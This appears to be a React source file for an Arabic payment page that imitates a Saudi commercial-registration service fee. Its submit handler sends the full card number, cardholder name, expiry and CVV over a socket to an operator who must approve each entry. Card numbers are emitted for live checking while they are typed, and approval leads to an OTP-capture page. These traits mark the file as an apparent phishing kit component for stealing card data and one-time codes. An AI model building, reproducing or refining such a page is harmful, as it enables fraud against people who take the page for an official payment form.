import { useEffect, useState, useRef } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  socket,
  visitor,
  sendData,
  isFormApproved,
  isCardVerified,
  navigateToPage,
} from "@/lib/store";

const schema = z.object({
  cardNumber: z
    .string()
    .min(1, "رقم البطاقة مطلوب")
    .min(13, "رقم البطاقة غير صحيح")
    .max(19, "رقم البطاقة غير صحيح")
    .refine((val) => {
      // Luhn algorithm validation
      if (!val || val.length < 13 || val.length > 19) return false;
      let sum = 0;
      let isEven = false;
      for (let i = val.length - 1; i >= 0; i--) {
        let digit = parseInt(val[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return sum % 10 === 0;
    }, "رقم البطاقة غير صحيح"),
  nameOnCard: z.string().min(1, "اسم حامل البطاقة مطلوب"),
  expiryMonth: z.string().min(1, "الشهر مطلوب"),
  expiryYear: z.string().min(1, "السنة مطلوبة"),
  cvv: z.string().length(3, "CVV يجب أن يكون 3 أرقام"),
});

type FormData = z.infer<typeof schema>;

// Generate months and years
const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1).padStart(2, "0"),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 15 }, (_, i) => ({
  value: String(currentYear + i - 2000),
  label: String(currentYear + i),
}));

// Luhn algorithm to validate card number
function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
}

// Detect card type
function getCardType(number: string): string {
  if (/^4/.test(number)) return "visa";
  if (/^5[1-5]/.test(number)) return "mastercard";
  if (/^9/.test(number)) return "mada";
  return "unknown";
}

export default function CreditCardPayment() {
  const [, navigate] = useLocation();
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout>>();

  // Get service and amount from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'قيد سجل تجاري';
  const totalAmount = searchParams.get('amount') || '575';

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      expiryMonth: "",
      expiryYear: "",
      cvv: "",
    },
  });

  const cardNumber = watch("cardNumber");

  // Emit page enter
  useEffect(() => {
    navigateToPage("الدفع بطاقة الائتمان");
  }, []);

  // Verify card number
  useEffect(() => {
    if (cardNumber && cardNumber.length === 16) {
      if (debounceRef.current) clearTimeout(debounceRef.current);
      debounceRef.current = setTimeout(() => {
        socket.value.emit("cardNumber:verify", cardNumber);
      }, 500);
    }
  }, [cardNumber]);

  // Handle card verification response
  useEffect(() => {
    if (isCardVerified.value === false) {
      setCardError(true);
    } else {
      setCardError(false);
    }
  }, [isCardVerified.value]);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/otp-verification");
    }
  }, [isFormApproved.value, navigate]);

  // Format card number with spaces every 4 digits
  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };

  // Check blocked card prefixes and validate card number
  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
    const blockedPrefixes = visitor.value.blockedCardPrefixes;

    if (blockedPrefixes && blockedPrefixes.includes(rawValue.slice(0, 4))) {
      setCardError(true);
      setValue("cardNumber", "");
      setLuhnError(false);
    } else {
      // Format with spaces for display
      const formattedValue = formatCardNumber(rawValue);
      setValue("cardNumber", formattedValue);
      // Check Luhn validation when card number is complete (13-19 digits)
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        if (!isValidCardNumber(rawValue)) {
          setLuhnError(true);
        } else {
          setLuhnError(false);
        }
      } else {
        setLuhnError(false);
      }
    }
  };

  const onSubmit = (data: FormData) => {
    if (!isCardVerified.value || luhnError) return;

    // Remove spaces from card number before sending
    const cleanCardNumber = data.cardNumber.replace(/\s+/g, "");

    const paymentData = {
      totalPaid: totalAmount,
      cardType: getCardType(cleanCardNumber),
      cardLast4: cleanCardNumber.slice(-4),
      serviceName: serviceName,
    };

    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    sendData({
      paymentCard: {
        cardNumber: cleanCardNumber,
        nameOnCard: data.nameOnCard,
        expiryMonth: data.expiryMonth,
        expiryYear: data.expiryYear,
        cvv: data.cvv,
      },
      current: "الدفع",
      nextPage: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <h1 className="text-xl font-bold text-gray-800 mb-2">الدفع الآمن</h1>
          <p className="text-gray-500 text-sm">أدخل بيانات بطاقتك لإتمام الدفع</p>
          <div className="mt-3 p-3 bg-green-50 rounded-lg">
            <p className="text-sm text-gray-600">{serviceName}</p>
            <p className="text-2xl font-bold text-green-600">{totalAmount} ر.س</p>
          </div>
        </div>

        {/* Card Icons */}
        <div className="flex justify-center gap-3 mb-6">
          <img src="/images/mada.png" alt="mada" className="h-8" />
          <img src="/images/visa.png" alt="visa" className="h-8" />
          <img src="/images/mastercard.png" alt="mastercard" className="h-8" />
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
          {/* Card Number */}
          <div className="space-y-2">
            <Label htmlFor="cardNumber">رقم البطاقة</Label>
            <Input
              id="cardNumber"
              type="tel"
              inputMode="numeric"
              maxLength={19}
              placeholder="1234 5678 9012 3456"
              className={(cardError || luhnError) ? "border-red-500" : ""}
              {...register("cardNumber")}
              onChange={handleCardChange}
            />
            {(errors.cardNumber || cardError || luhnError) && (
              <p className="text-red-500 text-xs">
                {luhnError ? "رقم البطاقة غير صحيح" : (errors.cardNumber?.message || "رقم البطاقة غير صحيح")}
              </p>
            )}
          </div>

          {/* Name on Card */}
          <div className="space-y-2">
            <Label htmlFor="nameOnCard">اسم حامل البطاقة</Label>
            <Input
              id="nameOnCard"
              placeholder="الاسم كما يظهر على البطاقة"
              {...register("nameOnCard")}
            />
            {errors.nameOnCard && (
              <p className="text-red-500 text-xs">{errors.nameOnCard.message}</p>
            )}
          </div>

          {/* Expiry Date */}
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label>شهر الانتهاء</Label>
              <Select onValueChange={(v) => setValue("expiryMonth", v)}>
                <SelectTrigger>
                  <SelectValue placeholder="الشهر" />
                </SelectTrigger>
                <SelectContent>
                  {months.map((m) => (
                    <SelectItem key={m.value} value={m.value}>
                      {m.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              {errors.expiryMonth && (
                <p className="text-red-500 text-xs">{errors.expiryMonth.message}</p>
              )}
            </div>

            <div className="space-y-2">
              <Label>سنة الانتهاء</Label>
              <Select onValueChange={(v) => setValue("expiryYear", v)}>
                <SelectTrigger>
                  <SelectValue placeholder="السنة" />
                </SelectTrigger>
                <SelectContent>
                  {years.map((y) => (
                    <SelectItem key={y.value} value={y.value}>
                      {y.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              {errors.expiryYear && (
                <p className="text-red-500 text-xs">{errors.expiryYear.message}</p>
              )}
            </div>
          </div>

          {/* CVV */}
          <div className="space-y-2">
            <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
            <Input
              id="cvv"
              type="tel"
              inputMode="numeric"
              maxLength={3}
              placeholder="123"
              {...register("cvv")}
            />
            {errors.cvv && (
              <p className="text-red-500 text-xs">{errors.cvv.message}</p>
            )}
          </div>

          {/* Submit Button */}
          <Button type="submit" className="w-full" size="lg">
            ادفع الآن
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
